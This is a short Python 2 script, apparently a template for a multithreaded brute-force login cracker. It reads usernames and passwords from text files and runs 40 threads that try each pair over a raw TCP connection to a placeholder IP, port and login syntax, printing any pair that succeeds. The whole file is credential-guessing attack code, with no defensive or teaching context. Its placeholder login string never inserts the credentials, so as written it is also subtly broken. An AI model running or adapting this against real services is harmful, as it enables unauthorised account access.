#!/usr/bin/python
 
import threading
import Queue
import socket
 
usernameList = open('users.txt','r').read().splitlines()
passwordList = open('passwords.txt','r').read().splitlines()
 
class WorkerThread(threading.Thread) :
 
	def __init__(self, queue, tid) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
 
	def run(self) :
		while True :
			username = None 
 
			try :
				username = self.queue.get(timeout=1)
 
			except 	Queue.Empty :
				return
 
			try :
				for password in passwordList:
                                	tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                	tcpSocket.connect(('### IP Address ###',### Port ###))
                                	tcpSocket.recv(1024)
                                	tcpSocket.send("### Syntax that allows login ###")
                                	if '### Fail Response ###' in tcpSocket.recv(1024):
                                	        tcpSocket.close()
                                	        print "Failed " + username + "/" + password
                                	else:
                                	        print "[+] Successful Login! Username: " + username + " Password: " + password
			except :
				raise 
 
			self.queue.task_done()
 
queue = Queue.Queue()
 
threads = []
for i in range(1, 40) : # Number of threads
	worker = WorkerThread(queue, i) 
	worker.setDaemon(True)
	worker.start()
	threads.append(worker)
 
for username in usernameList :
	queue.put(username)     # Push usernames onto queue
 
queue.join()
 
# wait for all threads to exit 
 
for item in threads :
	item.join()
 
print "Testing Complete!"